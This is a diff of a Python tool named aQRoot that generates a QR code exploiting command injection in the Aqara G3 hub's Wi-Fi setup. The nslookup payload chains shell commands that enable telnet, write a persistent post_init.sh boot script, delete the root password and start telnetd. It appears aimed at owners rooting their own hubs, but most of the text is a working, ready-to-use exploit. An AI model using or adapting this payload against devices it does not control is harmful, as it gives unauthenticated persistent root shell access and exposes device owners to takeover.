@@ -4,62 +4,65 @@ import segno
 
 __title__ = "aQRoot"
 __desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
-__version__ = "0.1"
+__version__ = "0.2"
 __author__ = "Gareth Bryan"
 __license__ = "MIT"
 
-iArr = [[-128, -48, 33, 164], [-47, 32, 34, 84], [33, 35, -1, 0], [127, 127, 35, -91]]
-
 
 def cipher(data):
-    out = ""
-    for c in data:
-        for j in iArr:
-            if j[0] > c or j[1] < c:
-                continue
-            out += (j[2] if j[2] != -1 else c) + j[3] + c
-        out += chr(0xA2 - c)
-    return out
+    return "".join([chr(0xa2 - ord(c)) for c in data])
 
 
-def generate_payload(ssid, pwd, domain="aiot-coap.aqara.cn"):
+def generate_payload(ssid, pwd, payload, post_init):
     """
-    Here be dragons
-    nslookup sprintf buffer is [132] - do not exceed 124 on key d
+    qrcode buffer is [1024]
+    nslookup sprintf buffer [132]
+    "nslookup a;<payload>0x00"
     """
-    payload = {
-        "b": "lumiLZc1dhEfPzMN",
-        "d": ";".join(
-            [
-                domain,
-                'x="fw_""manager.sh"',  	# Workaround - Script checks if it's already running by grepping ps.
-                "$x -t -k",  			# Enable tty and telnetd
-                "$x -t -f",  			# Create default /data/scripts/post_init.sh
-                "y=/data/scripts/post_init.sh",
-                'echo "$x -t -k" >> $y',  	# Append tty enable and telnetd start to post_init script
-                "chmod 555 $y",  		# Remove write access to post_init script
-            ]
-        ),
-        "x": cipher(ssid.encode()),
-        "y": cipher(pwd.encode()),
+    payload.insert(0, 'a')
+    qrcode_data = {
+        "b": "\\n".join(post_init),
+        "d": ";".join(payload),
+        "x": cipher(ssid),
+        "y": cipher(pwd),
         "l": "en",
     }
-    return "&".join([f"{k}={v}" for k, v in payload.items()])
+    payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
+    if len(qrcode_data['d']) > 121:
+        raise ValueError(f"Payload (d) exceeds buffer {len(qrcode_data['d'])}/122")
+    if len(payload_string) > 1023:
+        raise ValueError(f"Payload string exceeds qrcode buffer {len(payload_string)}/1024")
+    return payload_string
 
 
 def gen_qrcode(data, outfile=None):
     qrcode = segno.make(data, error="h")
-    qrcode.terminal(compact=True, border=10)
+    qrcode.terminal(compact=True, border=5)
     if outfile:
-        qrcode.save(outfile, border=10, scale=8)
+        qrcode.save(outfile, border=5, scale=8)
 
 
 def main(args):
-    data = generate_payload(
-        ssid=args.ssid,
-        pwd=args.pwd,
-    )
-    gen_qrcode(data, args.filename)
+    try:
+        data = generate_payload(
+            ssid=args.ssid,
+            pwd=args.pwd,
+            payload=[
+                'y=/data/scripts/post_init.sh',
+                '"fw_man"ager.sh -t -f',
+                'echo -e `agetprop persist.app.bind_key`>$y',
+                'tail -n2 $y|sh',
+            ],
+            post_init = [
+                '#!/bin/sh',
+                'fw_manager.sh -r',
+                'passwd -d $USER',
+                'fw_manager.sh -t -k'
+            ],
+        )
+        gen_qrcode(data, args.filename)
+    except ValueError as e:
+        print(e)
 
 
 if __name__ == "__main__":
@@ -71,7 +74,10 @@ if __name__ == "__main__":
         "ssid",
         help="Wireless SSID",
     )
-    parser.add_argument("pwd", help="Wireless Password")
+    parser.add_argument(
+        "pwd",
+        help="Wireless Password"
+    )
     parser.add_argument(
         "filename",
         nargs="?",
@@ -80,4 +86,3 @@ if __name__ == "__main__":
     )
     args = parser.parse_args()
     main(args)
-
